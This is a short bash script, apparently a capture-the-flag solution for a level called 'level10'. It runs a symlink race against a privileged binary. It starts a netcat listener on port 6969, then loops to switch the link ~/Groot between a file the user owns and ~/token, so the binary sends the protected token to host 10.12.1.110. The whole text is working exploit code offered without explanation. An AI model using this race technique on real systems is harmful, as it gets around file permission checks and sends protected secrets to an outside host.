#!/bin/bash

touch MY_FILE
chmod 777 MY_FILE

(while true; do nc -l 6969; done)&

(while [ true ]
do
	~/level10 ~/Groot 10.12.1.110 2>&- 1>&-
done)&

(while [ true ]
do
	ln -fs ~/MY_FILE ~/Groot 2>&- 1>&-
	ln -fs ~/token ~/Groot 2>&- 1>&-
done)&
